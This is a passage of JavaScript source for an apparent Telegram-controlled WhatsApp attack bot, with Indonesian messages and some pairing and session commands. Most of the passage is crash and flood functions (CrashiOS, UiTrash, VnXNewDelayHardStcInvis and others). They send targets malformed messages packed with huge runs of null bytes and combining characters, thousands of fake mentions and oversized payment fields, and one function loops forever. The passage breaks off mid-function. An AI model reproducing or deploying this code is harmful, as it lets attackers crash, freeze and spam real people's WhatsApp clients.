        inline_keyboard: [[{ text: "dєvєlσpєrs", url: "https://t.me/sennsofhopee" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("✅ Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("❌ Tidak ada session yang tersimpan saat ini.");
  }
});
////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////START FUNC/////////////////////////
async function VnXNewSpamNotifToDelayInvisV2(sock, target) {
  const VnXMesegej = {
    groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
            text: "Salvador" + "\u00000".repeat(250000) + "\x10".repeat(60000),
            contextInfo: {
              participant: target,
              mentionedJid: [
                '0@s.whatsapp.net',
                ...(() => {
                  const listJid = [];
                  for (let i = 0; i < 2000; i++) {
                    let num = Math.floor(Math.random() * 900000);
                    listJid.push(`1${num}@s.whatsapp.net`);
                  }
                  return listJid;
                })()
              ],
            }
          }
        }
      }
    };

  let vnxmsg = { remoteJid: target, fromMe: true, id: VnXMesegej }

     const vnxspam = {
        statusQuestionAnswerMessage: {
          key: vnxmsg, 
          text: "Salvador Is Here",
        } 
     };

    await sock.relayMessage(target, VnXMesegej, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxspam, { 
    participant: { jid: target } 
  });
}

async function VnXNewDelayHardStcInvis(sock, target) {
  const VnXStc = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: {
          url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=0   1_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true',
          fileSha256: 'SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=',
          fileEncSha256: 'l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=',
          mediaKey: 'UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=',
          mimetype: 'image/webp',
          directPath:
            '/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c',
          fileLength: '10610',
          mediaKeyTimestamp: '1775044724',
          stickerSentTs: '1775044724091',
          contextInfo: {
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            isForwarded: true,
            forwardingScore: 250208,
            businessMessageForwardInfo: {
              businessOwnerJid: '13135550002@s.whatsapp.net',
            },
            participant: '13135550002@s.whatsapp.net',
            remoteJid: 'status@broadcast',
            quotedMessage: {
              interactiveResponseMessage: {
                body: {
                  text: 'Salvador Is Here',
                  format: 'DEFAULT',
                },
                nativeFlowResponseMessage: {
                  buttons: [
                    {
                      name: 'galaxy_message',
                      buttonParamsJson: 'u0000'.repeat(250000),
                    },
                  ],
                },
              },
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, VnXStc, {
    participant: { jid: target },
  });
}

async function Delay(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
}

async function Ipongforcloseivs(target) {
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); 
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessagex = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/IniNexiReal",
      }
      let msgx = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessagex
            }
         }
      }, {});
      let extendMsgx = {
         extendedTextMessage: { 
            text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "helow",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msgx2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsgx
            }
         }
      }, {});
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "Salvador" + TravaIphone, 
            matchedText: "Salvador",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "Salvador" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      
      for (let i = 0; i < 10; i++) {
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msgx.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msgx2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
     
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
          if (i < 9) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
      }
   } catch (err) {
      console.error(err);
   }
};

async function VnXNewOneButtonsBlnk(sock, target) {
  const VnXOneButton = [
    {
      buttonId: "VnX",
      buttonText: {
        displayText: "ꦽ".repeat(80000)
      },
      type: 1
    }
  ];

 const vnxbtns = {
   buttonsMessage: {
      contentText: "ꦾ".repeat(250000),
      footerText: "\u0000".repeat(15000),
      buttons: VnXOneButton,
      headerType: 1
    }
  };
   
    const VnXblnksltter = {
       newsletterAdminInviteMessage: {
          newsletterJid: "120363321780343299@newsletter",
          newsletterName: "Coba Kamu Pencet Chat Ini 🍁" + "ꦽꦾ".repeat(250000),
          caption: "Maklo Bng" + "ꦽꦾ".repeat(250000),
          inviteExpiration: "9282682616283736",    
       }
    };
  
   await sock.relayMessage(target, VnXblnksltter, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxbtns, { 
    participant: { jid: target } 
  });
}
async function XTVXTVXTV(sock, target) {
const vnxpayment = {
interactiveMessage: {
body: { text: "Maklo Payment" },
nativeFlowMessage: {
buttons: [{
name: "payment_info",
buttonParamsJson: `{
"currency":"IDR",
"total_amount":{"value":0,"offset":100},
"reference_id":"${Date.now()}",
"type":"physical-goods",
"order":{
"status":"pending",
"subtotal":{"value":0,"offset":100},
"order_type":"ORDER",
"items":[{
"name":"${'ꦾ'.repeat(5000)}",
"amount":{"value":0,"offset":100},
"quantity":0,
"sale_amount":{"value":0,"offset":100}
}]
},
"payment_settings":[{
"type":"pix_static_code",
"pix_static_code":{
"merchant_name":"Rafi",
"key":"${'\u0000'.repeat(900000)}",
"key_type":"CPF"
}
}],
"share_payment_status":false
}`
}]
}
}
};
await sock.relayMessage(target, vnxpayment, { participant: { jid: target } });
}

async function VnXNewStuckNotif(sock, target) {
const VnXOneButton = [
    {
      buttonId: "Salvador",
      buttonText: {
        displayText: "𑇂𑆵𑆴𑆿".repeat(250000)
      },
      type: 1
    },
    {
      buttonId: "Salvador",
      buttonText: {
        displayText: "ꦽ".repeat(250000)
      },
      type: 1
    }
  ];

 const vnxishere = {
   buttonsMessage: {
      contentText: "ꦾ".repeat(250000),
      footerText: "\u0000".repeat(15000),
      buttons: VnXOneButton,
      headerType: 1
    }
  };
    
    const vnxdocu = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/703563712_905366362578714_8094704431314052327_n.enc?ccb=11-4&oh=01_Q5Aa4gF59X7Izjc575RDOUshdWcog1uM3U3OJP-7mT0-YHtCoA&oe=6A351922&_nc_sid=5e03e0&mms3=true",
            directPath: "/v/t62.7119-24/703563712_905366362578714_8094704431314052327_n.enc?ccb=11-4&oh=01_Q5Aa4gF59X7Izjc575RDOUshdWcog1uM3U3OJP-7mT0-YHtCoA&oe=6A351922&_nc_sid=5e03e0",
            mimetype: "application/javascript",
            mediaKey: "SBGOHAa4M/YBxn9MHuX761PYexb1Xd0lqfCTPvjj0gE=",
            fileEncSha256: "CaQz36a30wwkgZjp7kykE0Ndr4EZLVa0zQum6N/ywpU=",
            fileSha256: "B/8TvtqnmHaIe9yc9BklG8WOvL2Xx4Hb1OO47UYk39E=",
            fileLength: "198974589",
            mediaKeyTimestamp: "1779281528",
            caption: "𑇂𑆵𑆴𑆿".repeat(250000),
            footerText: "\u0000".repeat(15000),
        }
    };
    
    const vnxloca = {
        locationMessage: {
          degreesLatitude: 99.1010101,
          degreesLongitude: 99.1010101, 
          name: "Salvador" + "𑇂𑆵𑆴𑆿".repeat(60000),
          address: "ꦾ".repeat(60000),
        }
    };
    
    const vnxaudio = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/703577113_1518991829861602_3564955985215902855_n.enc?ccb=11-4&oh=01_Q5Aa4gHlts2atOfFtZscRNyQV2dqVL9dg2D16Sg_9plc7gqSiw&oe=6A3513F8&_nc_sid=5e03e0&mms3=true",
            directPath: "/v/t62.7114-24/703577113_1518991829861602_3564955985215902855_n.enc?ccb=11-4&oh=01_Q5Aa4gHlts2atOfFtZscRNyQV2dqVL9dg2D16Sg_9plc7gqSiw&oe=6A3513F8&_nc_sid=5e03e0",
            mimetype: "audio/ogg",
            mediaKey: "wwlS94/28a2N8MmwOhvsyFA3D96VAlW5qMgORaJSaNE=",
            fileEncSha256: "S3OzTzuRjXv0ou74k3VcAfMlLYggWeI4b/1UVX4DBfA=",
            fileSha256: "Cw92qjCxUKIlQS5I+VrMvE8lVuM19L5nIz50v96NZkU=",
            fileLength: "61956999",
            mediaKeyTimestamp: "1779281865",
            caption: "VnX" + "ꦾ".repeat(250000),
        }
    };
    
    const vnxtter = {
       newsletterAdminInviteMessage: {
          newsletterJid: "9999999999999999@newsletter",
          newsletterName: "Salvador" + "ꦽꦾ".repeat(250000),
          caption: "Salvador Bng" + "ꦽꦾ".repeat(250000),
          inviteExpiration: "9282682616283799",    
       }
    };


    
    let vnxmsg = { remoteJid: target, fromMe: true, id: vnxishere }

     const vnxspam = {
        statusQuestionAnswerMessage: {
          key: vnxmsg, 
          text: "Spam Notif",
        } 
     };

  await sock.relayMessage(target, vnxishere, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxdocu, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxloca, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxtter, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxspam, { 
    participant: { jid: target } 
  });
}

async function VnXNewblankNotif(sock, target) {
  const VnXbb = {
      interactiveMessage: {
        body: { 
         text: "Maklo",
         footer: "Maklo Is Here"
       },
        nativeFlowMessage: {
          buttons: [
            {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "Maklo Is Here",
              url: "http://wa.mE/stickerpack/VnX"
              }),
            },
            {
              name: "payment_info",
              buttonParamsJson: JSON.stringify({
                payment_settings: [{
                  type: "pix_static_code",
                  pix_static_code: {
                    merchant_name: "ោ៝".repeat(121500),
                    key: "ꦾ".repeat(250000),
                    key_type: "CPF"
                  }
                }]
              })
            }
          ]
        }
      }
    };   
   
    let vnxmsg = { remoteJid: target, fromMe: true, id: VnXbb }

     const vnxspam = {
        statusQuestionAnswerMessage: {
          key: vnxmsg, 
          text: "Maklo Is Here",
        } 
     };

    await sock.relayMessage(target, VnXbb, { 
    participant: { jid: target } 
  });
    
    await sock.relayMessage(target, vnxspam, { 
    participant: { jid: target } 
  });
}

async function SennBlankUiGroupNew(sock, target) {
  const SennBlankButton = [
    {
      buttonId: "By maklo",
      buttonText: {
        displayText: "ꦽ".repeat(80000)
      },
      type: 1
    }
  ];

  const btns = {
    buttonsMessage: {
      contentText: "ꦾ".repeat(250000),
      footerText: "\u0000".repeat(15000),
      buttons: SennBlankButton,
      headerType: 1
    }
  };

  const blnkuisltter = {
    newsletterAdminInviteMessage: {
      newsletterJid: "120363404343696075@newsletter",
      newsletterName: "BlankGroupButtonBySenn" + "ꦽꦾ".repeat(250000),
      caption: "Group Ampas" + "ꦽꦾ".repeat(250000),
      inviteExpiration: "9282682616283736",
    }
  };

  await sock.relayMessage(target, blnkuisltter, {});
  
  await sock.relayMessage(target, btns, {});
}

async function AmbaPlerBgt(sock, target) {
  const msg = {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{
  "currency": "IDR",
  "total_amount": {
    "value": 0,
    "offset": 100
  },
  "reference_id": "${Date.now()}",
  "type": "physical-goods",
  "order": {
    "status": "pending",
    "subtotal": {
      "value": 0,
      "offset": 100
    },
    "order_type": "ORDER",
    "items": [
      {
        "name": "${'ꦾ'.repeat(5000)}",
        "amount": {
          "value": 0,
          "offset": 100
        },
        "quantity": 0,
        "sale_amount": {
          "value": 0,
          "offset": 100
        }
      },
      {
        "name": "${'ꦾ'.repeat(4000)}",
        "amount": {
          "value": 999999999,
          "offset": 100
        },
        "quantity": 999,
        "sale_amount": {
          "value": 999999999,
          "offset": 100
        }
      }
    ]
  },
  "payment_settings": [
    {
      "type": "pix_static_code",
      "pix_static_code": {
        "merchant_name": "amba${'ꦾ'.repeat(3000)}",
        "key": "${'\u0000'.repeat(900000)}",
        "key_type": "AMBA"
      }
    },
    {
      "type": "credit_card",
      "credit_card": {
        "merchant_name": "${'𑇂𑆵𑆴𑆿'.repeat(2000)}",
        "amount": 999999999
      }
    }
  ],
  "share_payment_status": false,
  "expiry_time": ${Date.now() + 999999999},
  "retry_count": 999
}`
          }
        ]
      },
      contextInfo: {
        stanzaId: "ambajahat",
        mentionedJid: Array.from({ length: 1000 }, (_, i) => `6281${i}@s.whatsapp.net`),
        forwardingScore: 999999999,
        isForwarded: true
      }
    }
  }

  await sock.relayMessage(target, msg, { participant: { jid: target } })
}

async function UiTrash(target) {
  const msg = generateWAMessageFromContent(target, {
    pollCreationMessage: {
      name: "ꦹ".repeat(50000),
      options: [
        { optionName: "Maklo - Here" },
        { optionName: "..." },
        { optionName: "{}" }
      ],
      selectableOptionsCount: 123456789,
      pollType: "QUIZ",
      correctAnswer: {
        optionName: "\0".repeat(500000),
      },
      contextInfo: {
        forwardingScore: 99999999999,
        isForwarded: true
      }
    }
  }, {})

  await sock.relayMessage(target, msg.message, {})
}

async function VnXNewDelayTended(sock, target) {
  while (true) {
    const vnxtest = {
      groupStatusMessageV2: {
        message: {
          extendedTextMessage: {
             text: "Nexi is back" + "\0".repeat(250000),
              contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
               ),
             ],       
            }
          }
        }
      }
    };

    try {
      await sock.relayMessage(target, vnxtest, {
        participant: { jid: target },
      });
    } catch (e) {
      console.log("❌ Error di dalam loop:", e);
    }
  }
}

async function CrashiOS(target) {
  const msg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
            deviceListMetaData: {
              senderKeyIndexes: [],
              recipientKeyIndexes: [],
              senderTimeStamp: [],
              recipientKeyHash: [],
              recipientTimdStamp: []
            },
            deviceListMetaDataVersion: 2
          },
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.99963118999,
            jpegThumbnail: null,
            name: "💤⃟⃰ᰧ./##### ✩ >" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
            url: `https://xnxx-snith.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
          },
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: "💤⃟⃰ᰧ./##### ✩ " + "𑇂𑆵𑆴𑆿".repeat(60000)
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
              },
              placeholderKey: {
                remoteJid: "0.@s.whatsapp.net",
                fromMe: false,
                id: client.generateMessageTag()
              }
            }
          }
      }
    }
  };
  
  await client.relayMessage(target, msg, {
    participant: {
      jid: target
    }
  });
}

async function VnXNewDelayXBlank(sock, target) {
  const VnXAudio = {
    groupStatusMessageV2: {
      message: {
